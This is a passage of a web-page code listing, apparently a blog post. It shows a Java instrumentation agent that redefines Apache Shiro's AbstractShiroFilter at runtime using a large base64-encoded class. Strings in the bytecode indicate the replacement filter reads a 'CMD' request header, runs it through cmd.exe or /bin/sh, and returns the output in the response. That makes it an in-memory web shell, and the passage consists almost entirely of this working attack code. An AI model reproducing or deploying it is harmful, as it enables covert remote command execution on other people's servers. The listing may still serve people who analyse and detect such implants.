AUwBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEABy9iaW4vc2gBAAIvYwEAAi1jAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABwAU0MAU4BTwwBUAFRBwFSDAFTAVQBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBJAwBVQFWDAFXAVgMAVkAcQEAE2phdmEvaW8vUHJpbnRXcml0ZXIMAVoBWwwAcAFcDAFdAV4MAHABXwwBVwExDAFgAHEMAI0AjgwAkgCTDACVAJYBADJvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L0Fic3RyYWN0U2hpcm9GaWx0ZXIkMQwAcAFhDAFiAWMBACtvcmcvYXBhY2hlL3NoaXJvL3N1YmplY3QvRXhlY3V0aW9uRXhjZXB0aW9uDAFkAWUBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAYRmlsdGVyZWQgcmVxdWVzdCBmYWlsZWQuDABwAUEMAHgAeQEAQ05vIEZpbHRlckNoYWluUmVzb2x2ZXIgY29uZmlndXJlZC4gIFJldHVybmluZyBvcmlnaW5hbCBGaWx0ZXJDaGFpbi4MAWYBMQcBJgwBZwCpAQA6UmVzb2x2ZWQgYSBjb25maWd1cmVkIEZpbHRlckNoYWluIGZvciB0aGUgY3VycmVudCByZXF1ZXN0LgwBaAExAQBGTm8gRmlsdGVyQ2hhaW4gY29uZmlndXJlZCBmb3IgdGhlIGN1cnJlbnQgcmVxdWVzdC4gIFVzaW5nIHRoZSBkZWZhdWx0LgwAqACpBwEiDAFpAJgBADBvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L0Fic3RyYWN0U2hpcm9GaWx0ZXIHAWoMAWsBbAEAMW9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvT25jZVBlclJlcXVlc3RGaWx0ZXIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQArb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAIG9yZy9hcGFjaGUvc2hpcm8vc3ViamVjdC9TdWJqZWN0AQAgb3JnL2FwYWNoZS9zaGlyby9zZXNzaW9uL1Nlc3Npb24BABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAJbQgEAM29yZy9hcGFjaGUvc2hpcm8vd2ViL2ZpbHRlci9tZ3QvRmlsdGVyQ2hhaW5SZXNvbHZlcgEAHm9yZy9hcGFjaGUvc2hpcm8vU2VjdXJpdHlVdGlscwEAKShMb3JnL2FwYWNoZS9zaGlyby9tZ3QvU2VjdXJpdHlNYW5hZ2VyOylWAQAMZ2V0SW5pdFBhcmFtAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvQm9vbGVhbgEAB3ZhbHVlT2YBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQm9vbGVhbjsBAAxib29sZWFuVmFsdWUBABBvcmcvc2xmNGovTG9nZ2VyAQAEaW5mbwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWlzSHR0cFNlc3Npb25Nb2RlAQARZ2V0U2VydmxldENvbnRleHQBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0OwEASShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dDtaKVYBAH8oTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0O0xvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L1NoaXJvSHR0cFNlcnZsZXRSZXF1ZXN0OylWAQAnb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0AQBmKExvcmcvYXBhY2hlL3NoaXJvL21ndC9TZWN1cml0eU1hbmFnZXI7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAPYnVpbGRXZWJTdWJqZWN0AQArKClMb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0OwEACmdldFN1YmplY3QBACQoKUxvcmcvYXBhY2hlL3NoaXJvL3N1YmplY3QvU3ViamVjdDsBAApnZXRTZXNzaW9uAQAlKFopTG9yZy9hcGFjaGUvc2hpcm8vc2Vzc2lvbi9TZXNzaW9uOwEABXRvdWNoAQAFZXJyb3IBACooTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9UaHJvd2FibGU7KVYBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BAAlnZXRIZWFkZXIBAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAFd3JpdGUBAAcoW0JJSSlWAQAFZmx1c2gBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAZKExqYXZhL2lvL091dHB1dFN0cmVhbTspVgEAC3RvQnl0ZUFycmF5AQAEKClbQgEABShbQilWAQAFY2xvc2UBAI0oTG9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvQWJzdHJhY3RTaGlyb0ZpbHRlcjtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAdleGVjdXRlAQAzKExqYXZhL3V0aWwvY29uY3VycmVudC9DYWxsYWJsZTspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2F1c2UBABcoKUxqYXZhL2xhbmcvVGhyb3dhYmxlOwEABWRlYnVnAQAIZ2V0Q2hhaW4BAAV0cmFjZQEACGRvRmlsdGVyAQAXb3JnL3NsZjRqL0xvZ2dlckZhY3RvcnkBAAlnZXRMb2dnZXIBACUoTGphdmEvbGFuZy9DbGFzczspTG9yZy9zbGY0ai9Mb2dnZXI7BCEAYABiAAAABQAaAGUAZgAAABoAZwBoAAEAaQAAAAIACwACAGoAawAAAAIAbABtAAAAAgBuAG8AAAAXAAQAcABxAAEAcgAAACoAAgABAAAACiq3AAEqA7UAArEAAAABAHMAAAAOAAMAAABdAAQAXgAJAF8AAQB0AHUAAQByAAAAHQABAAEAAAAFKrQAA7AAAAABAHMAAAAGAAEAAABiAAEAdgB3AAEAcgAAACIAAgACAAAABiortQADsQAAAAEAcwAAAAoAAgAAAGYABQBnAAEAeAB5AAEAcgAAAB0AAQABAAAABSq0AASwAAAAAQBzAAAABgABAAAAagABAHoAewABAHIAAAAiAAIAAgAAAAYqK7UABLEAAAABAHMAAAAKAAIAAABuAAUAbwABAHwAfQABAHIAAAAdAAEAAQAAAAUqtAACrAAAAAEAcwAAAAYAAQAAAIIAAQB+AH8AAQByAAAAIgACAAIAAAAGKhu1AAKxAAAAAQBzAAAACgACAAAAkgAFAJMAFACAAHEAAgByAAAAUAABAAEAAAAbKrcABSq2AAYqtwAHKrYACJkACiq2AAm4AAqxAAAAAgBzAAAAGgAGAAAAlwAEAJgACACZAAwAmwATAJwAGgCeAIEAAAADAAEaAIIAAAAEAAEAgwACAIQAcQABAHIAAABXAAIAAwAAAB0qEgu2AAxMK8YAFCu4AA1NLMYACyostgAOtgAPsQAAAAIAcwAAABoABgAAAKgABwCpAAsAqgAQAKsAFACsABwArwCBAAAACAAB/AAcBwCFAAEAhgBxAAIAcgAAABkAAAABAAAAAbEAAAABAHMAAAAGAAEAAACyAIIAAAAEAAEAgwACAIcAcQABAHIAAABYAAIAAgAAAB4qtgAJTCvHABeyABASEbkAEgIAKrYAE0wqK7YAFLEAAAACAHMAAAAaAAYAAAC6AAUAuwAJALwAEwC9ABgAvgAdAMAAgQAAAAgAAfwAHQcAiAAEAIkAdQABAHIAAAAgAAIAAQAAAAi7ABVZtwAWsAAAAAEAcwAAAAYAAQAAAMMABACKAH0AAQByAAAAIgABAAEAAAAKKrYACbkAFwEArAAAAAEAcwAAAAYAAQAAAMcABACLAIwAAQByAAAAKQAFAAIAAAARuwAYWSsqtgAZKrYAGrcAG7AAAAABAHMAAAAGAAEAAADTAAQAjQCOAAEAcgAAAFEAAgAGAAAAGys6BCvBAByZABErwAAcOgUqGQW2AB06BBkEsAAAAAIAcwAAABYABQAAAOYAAwDnAAoA6AAQAOkAGADrAIEAAAAIAAH8ABgHAI8ABACQAJEAAQByAAAAJgAFAAMAAAAOuwAeWSsqtgAZLLcAH7AAAAABAHMAAAAGAAEAAAD5AAQAkgCTAAEAcgAAAFsAAwAFAAAAKSw6BCq2ABqaAB8rwQAYmQAYLMEAIJkAESoswAAgK8AAGLYAIToEGQSwAAAAAgBzAAAAEgAEAAABEAADAREAGAEVACYBFwCBAAAACAAB/AAmBwCUAAQAlQCWAAEAcgAAACkABQADAAAAEbsAIlkqtgAJKyy3ACO2ACSwAAAAAQBzAAAABgABAAABJAAEAJcAmAABAHIAAACeAAMABgAAADYqtgAamgAxuAAlTi3GACktA7kAJgIAOgQZBMYAGxkEuQAnAQCnABE6BbIAEBIpGQW5ACoDALEAAQAdACQAJwAoAAIAcwAAACoACgAAATQABwE1AAsBNwAPATgAGAE5AB0BOwAkAT8AJwE8ACkBPQA1AUMAgQAAAB4AAv8AJwAFBwCZBwCPBwCUBwCaBwCbAAEHAJz5AA0ABACdAJ4AAgByAAADQQAHABAAAAFhAToEK8EAHJkA4bIAKyvBABy2ACwrwAAcOgUswAAgOgYZBRItuQAuAgA6BxkHxgC7Ei+4ADC2ADESMrYAMwKkAAcEpwAEAzYIBr0ANFkDFQiZAAgSNacABRI2U1kEFQiZAAgSN6cABRI4U1kFGQdTOgm7ADlZGQm3ADo6ChkKBLYAO1cZCrYAPLYAPToLuwA+WbcAPzoMEQQAvAg6DRkLGQ22AEBZNg4CpAAQGQwZDQMVDrYAQaf/6BkMtgBCuwBDWRkGuQBEAQC3AEU6DxkPuwA0WRkMtgBGtwBHtgBIGQ+2AEkZD7YASiorLC22AEs6BSoZBSwttgBMOgYqGQUZBrYATToHGQe7AE5ZKhkFGQYttwBPuQBQAgBXpwAVOgUZBbYAUjoEpwAJOgUZBToEGQTGAC8ZBMEAU5kACRkEwABTvxkEwQBUmQAJGQTAAFS/ElU6BbsAU1kZBRkEtwBWv7EAAgADARoBHQBRAAMBGgEpACgAAgBzAAAAngAnAAABYQADAWUACgFmABQBZwAaAWgAIAFqACsBawAwAW0ASAFuAHEBbwB8AXAAgwFxAI0BcgCWAXMAnQF1AKsBdgC4AXgAvQF6AM0BewDeAXwA4wF9AOgBhADxAYUA+wGHAQUBigEaAZUBHQGRAR8BkgEmAZUBKQGTASsBlAEvAZcBNAGYATwBmQFCAZsBSgGcAVABnwFUAaABYAGiAIEAAAEaAA//AEUACAcAmQcAjwcAlAcAnwcAnAcAoAcAoQcAhQAAQAH/ABEACQcAmQcAjwcAlAcAnwcAnAcAoAcAoQcAhQEAAwcAogcAogH/AAEACQcAmQcAjwcAlAcAnwcAnAcAoAcAoQcAhQEABAcAogcAogEHAIX/AAwACQcAmQcAjwcAlAcAnwcAnAcAoAcAoQcAhQEAAwcAogcAogH/AAEACQcAmQcAjwcAlAcAnwcAnAcAoAcAoQcAhQEABAcAogcAogEHAIX/ADMADgcAmQcAjwcAlAcAnwcAnAcAoAcAoQcAhQEHAKIHAKMHAKQHAKUHAKYAAPwAGgH/AC8ABQcAmQcAjwcAlAcAnwcAnAAAdAcAp0sHAJwFEg0PAIIAAAAGAAIAUwBUAAQAqACpAAEAcgAAAKEABAAHAAAASS06BCq2AFc6BRkFxwAPsgAQEli5AFkCAC2wGQUrLC25AFoEADoGGQbGABSyABASW7kAXAIAGQY6BKcADbIAEBJduQBcAgAZBLAAAAACAHMAAAAuAAsAAAG3AAMBuQAJAboADgG7ABgBvAAaAb8AJgHAACsBwQA1AcIAPAHEAEYBxwCBAAAAEgAD/QAaBwCfBwCq/AAhBwCfCQAEAKsAngACAHIAAAAzAAQABQAAABMqKywttgBeOgQZBCssuQBfAwCxAAAAAQBzAAAADgADAAAB4AAJAeEAEgHiAIIAAAAGAAIAVABTAAgArABxAAEAcgAAACIAAQAAAAAAChMAYLgAYbMAELEAAAABAHMAAAAGAAEAAABMAAIArQAAAAIArgBkAAAAEgACAE4AAAAAAAAAIgDSANQACQ==&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">          <span class="n">ClassDefinition</span> <span class="n">classDefinition</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassDefinition</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">arrayOfByte</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">          <span class="k">try</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">            <span class="n">paramInstrumentation</span><span class="o">.</span><span class="na">redefineClasses</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassDefinition</span><span class="o">[]</span> <span class="o">{</span> <span class="n">classDefinition</span> <span class="o">});</span>
-</span></span><span class="line"><span class="cl">          <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">          <span class="o">}</span>
-</span></span><span class="line"><span class="cl">        <span class="o">}</span>
-</span></span><span class="line"><span class="cl">      <span class="o">}</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{}</span>
-</span></span><span class="line"><span class="cl">  <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">HotSwapAgent</span> <span class="o">{</span>
+  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">premain</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">paramInstrumentation</span><span class="o">)</span> <span class="o">{}</span>
+  
+  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">agentmain</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">paramInstrumentation</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">try</span> <span class="o">{</span>
+      <span class="n">Class</span><span class="o">[]</span> <span class="n">arrayOfClass</span> <span class="o">=</span> <span class="n">paramInstrumentation</span><span class="o">.</span><span class="na">getAllLoadedClasses</span><span class="o">();</span>
+      <span class="k">for</span> <span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">:</span> <span class="n">arrayOfClass</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;org.apache.shiro.web.servlet.AbstractShiroFilter&#34;</span><span class="o">))</span> <span class="o">{</span>
+          <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+          <span class="kt">byte</span><span class="o">[]</span> <span class="n">arrayOfByte</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">BASE64Decoder</span><span class="o">()).</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="s">&#34;yv66vgAAADIBbQoAYgCvCQBgALAJAGAAsQkAYACyCgBgALMKAGAAtAoAYAC1CgBgALYKAGAAtwoAuAC5CABuCgBgALoKALsAvAoAuwC9CgBgAL4JAGAAvwgAwAsAwQDCCgBgAMMKAGAAxAcAxQoAFQCvCwDGAMcHAMgKAGAAyQoAYADKCgAYAMsHAMwKAGAAzQcAzgoAHgDPBwDQCgBgANEHANMKACIA1QoAIgDWCgC4ANcLANgA2QsA2gDbBwDcCADdCwDBAN4JAN8A4AoA4QDiCADjCwAcAOQIAOUKAN8A5goANADnCADoCgA0AOkHAOoIAOsIAOwIAO0IAO4HAO8KADkA8AoAOQDxCgA5APIKAPMA9AcA9QoAPgCvCgD2APcKAD4A+AoAPgD5BwD6CwAgAPsKAEMA/AoAPgD9CgA0AP4KAEMA/woAQwD5CgBDAQAKAGABAQoAYAECCgBgAQMHAQQKAE4BBQsA2AEGBwEHCgBRAQgHAQkHAQoIAQsKAFMBDAoAYAENCAEOCwDBAQ8LARABEQgBEgsAwQETCAEUCgBgARULARYBFwcBGAoBGQEaBwEbAQAAAQAMSW5uZXJDbGFzc2VzAQADbG9nAQASTG9yZy9zbGY0ai9Mb2dnZXI7AQAWU1RBVElDX0lOSVRfUEFSQU1fTkFNRQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADUNvbnN0YW50VmFsdWUBAA9zZWN1cml0eU1hbmFnZXIBAC1Mb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcjsBABNmaWx0ZXJDaGFpblJlc29sdmVyAQA1TG9yZy9hcGFjaGUvc2hpcm8vd2ViL2ZpbHRlci9tZ3QvRmlsdGVyQ2hhaW5SZXNvbHZlcjsBABxzdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkAQABWgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJnZXRTZWN1cml0eU1hbmFnZXIBAC8oKUxvcmcvYXBhY2hlL3NoaXJvL3dlYi9tZ3QvV2ViU2VjdXJpdHlNYW5hZ2VyOwEAEnNldFNlY3VyaXR5TWFuYWdlcgEAMChMb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcjspVgEAFmdldEZpbHRlckNoYWluUmVzb2x2ZXIBADcoKUxvcmcvYXBhY2hlL3NoaXJvL3dlYi9maWx0ZXIvbWd0L0ZpbHRlckNoYWluUmVzb2x2ZXI7AQAWc2V0RmlsdGVyQ2hhaW5SZXNvbHZlcgEAOChMb3JnL2FwYWNoZS9zaGlyby93ZWIvZmlsdGVyL21ndC9GaWx0ZXJDaGFpblJlc29sdmVyOylWAQAeaXNTdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkAQADKClaAQAfc2V0U3RhdGljU2VjdXJpdHlNYW5hZ2VyRW5hYmxlZAEABChaKVYBABFvbkZpbHRlckNvbmZpZ1NldAEADVN0YWNrTWFwVGFibGUBAApFeGNlcHRpb25zBwEcAQAnYXBwbHlTdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkQ29uZmlnBwDqAQAEaW5pdAEAFWVuc3VyZVNlY3VyaXR5TWFuYWdlcgcBHQEAHGNyZWF0ZURlZmF1bHRTZWN1cml0eU1hbmFnZXIBAA5pc0h0dHBTZXNzaW9ucwEAEndyYXBTZXJ2bGV0UmVxdWVzdAEARyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAVcHJlcGFyZVNlcnZsZXRSZXF1ZXN0AQB4KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7BwEeAQATd3JhcFNlcnZsZXRSZXNwb25zZQEAfyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TG9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvU2hpcm9IdHRwU2VydmxldFJlcXVlc3Q7KUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBABZwcmVwYXJlU2VydmxldFJlc3BvbnNlAQB5KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwcBHwEADWNyZWF0ZVN1YmplY3QBAGgoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylMb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0OwEAG3VwZGF0ZVNlc3Npb25MYXN0QWNjZXNzVGltZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYHARgHASAHASEHANwBABBkb0ZpbHRlckludGVybmFsAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgcBIgcAzAcA0AcBIwcA7wcBJAcA9QcBJQcBBwEAEWdldEV4ZWN1dGlvbkNoYWluAQB1KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwEmAQAMZXhlY3V0ZUNoYWluAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAYQWJzdHJhY3RTaGlyb0ZpbHRlci5qYXZhDABwAHEMAG4AbwwAagBrDABsAG0MAIQAcQwAhgBxDACHAHEMAHwAfQwAdAB1BwEnDAB2ASgMASkBKgcBKwwBLAEtDAEuAH0MAH4AfwwAZQBmAQAxTm8gU2VjdXJpdHlNYW5hZ2VyIGNvbmZpZ3VyZWQuICBDcmVhdGluZyBkZWZhdWx0LgcBLwwBMAExDACJAHUMAHYAdwEAMm9yZy9hcGFjaGUvc2hpcm8vd2ViL21ndC9EZWZhdWx0V2ViU2VjdXJpdHlNYW5hZ2VyBwEdDAEyAH0BADRvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L1NoaXJvSHR0cFNlcnZsZXRSZXF1ZXN0DAEzATQMAIoAfQwAcAE1AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAiwCMAQA1b3JnL2FwYWNoZS9zaGlyby93ZWIvc2VydmxldC9TaGlyb0h0dHBTZXJ2bGV0UmVzcG9uc2UMAHABNgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDACQAJEHATcBAC9vcmcvYXBhY2hlL3NoaXJvL3dlYi9zdWJqZWN0L1dlYlN1YmplY3QkQnVpbGRlcgEAB0J1aWxkZXIMAHABOAwBOQE6DAE7ATwHASAMAT0BPgcBIQwBPwBxAQATamF2YS9sYW5nL1Rocm93YWJsZQEAinNlc3Npb24udG91Y2goKSBtZXRob2QgaW52b2NhdGlvbiBoYXMgZmFpbGVkLiAgVW5hYmxlIHRvIHVwZGF0ZXRoZSBjb3JyZXNwb25kaW5nIHNlc3Npb24ncyBsYXN0IGFjY2VzcyB0aW1lIGJhc2VkIG9uIHRoZSBpbmNvbWluZyByZXF1ZXN0LgwBQAFBBwFCDAFDAUQHAUUMAUYAfwEAA0NNRAwBRwEqAQAHb3MubmFtZQwBSAEqDAFJAUoBAAd3aW5kb3dzDAFLAUwBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEABy9iaW4vc2gBAAIvYwEAAi1jAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABwAU0MAU4BTwwBUAFRBwFSDAFTAVQBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBJAwBVQFWDAFXAVgMAVkAcQEAE2phdmEvaW8vUHJpbnRXcml0ZXIMAVoBWwwAcAFcDAFdAV4MAHABXwwBVwExDAFgAHEMAI0AjgwAkgCTDACVAJYBADJvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L0Fic3RyYWN0U2hpcm9GaWx0ZXIkMQwAcAFhDAFiAWMBACtvcmcvYXBhY2hlL3NoaXJvL3N1YmplY3QvRXhlY3V0aW9uRXhjZXB0aW9uDAFkAWUBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAYRmlsdGVyZWQgcmVxdWVzdCBmYWlsZWQuDABwAUEMAHgAeQEAQ05vIEZpbHRlckNoYWluUmVzb2x2ZXIgY29uZmlndXJlZC4gIFJldHVybmluZyBvcmlnaW5hbCBGaWx0ZXJDaGFpbi4MAWYBMQcBJgwBZwCpAQA6UmVzb2x2ZWQgYSBjb25maWd1cmVkIEZpbHRlckNoYWluIGZvciB0aGUgY3VycmVudCByZXF1ZXN0LgwBaAExAQBGTm8gRmlsdGVyQ2hhaW4gY29uZmlndXJlZCBmb3IgdGhlIGN1cnJlbnQgcmVxdWVzdC4gIFVzaW5nIHRoZSBkZWZhdWx0LgwAqACpBwEiDAFpAJgBADBvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L0Fic3RyYWN0U2hpcm9GaWx0ZXIHAWoMAWsBbAEAMW9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvT25jZVBlclJlcXVlc3RGaWx0ZXIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQArb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAIG9yZy9hcGFjaGUvc2hpcm8vc3ViamVjdC9TdWJqZWN0AQAgb3JnL2FwYWNoZS9zaGlyby9zZXNzaW9uL1Nlc3Npb24BABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAJbQgEAM29yZy9hcGFjaGUvc2hpcm8vd2ViL2ZpbHRlci9tZ3QvRmlsdGVyQ2hhaW5SZXNvbHZlcgEAHm9yZy9hcGFjaGUvc2hpcm8vU2VjdXJpdHlVdGlscwEAKShMb3JnL2FwYWNoZS9zaGlyby9tZ3QvU2VjdXJpdHlNYW5hZ2VyOylWAQAMZ2V0SW5pdFBhcmFtAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvQm9vbGVhbgEAB3ZhbHVlT2YBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQm9vbGVhbjsBAAxib29sZWFuVmFsdWUBABBvcmcvc2xmNGovTG9nZ2VyAQAEaW5mbwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWlzSHR0cFNlc3Npb25Nb2RlAQARZ2V0U2VydmxldENvbnRleHQBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0OwEASShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dDtaKVYBAH8oTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0O0xvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L1NoaXJvSHR0cFNlcnZsZXRSZXF1ZXN0OylWAQAnb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0AQBmKExvcmcvYXBhY2hlL3NoaXJvL21ndC9TZWN1cml0eU1hb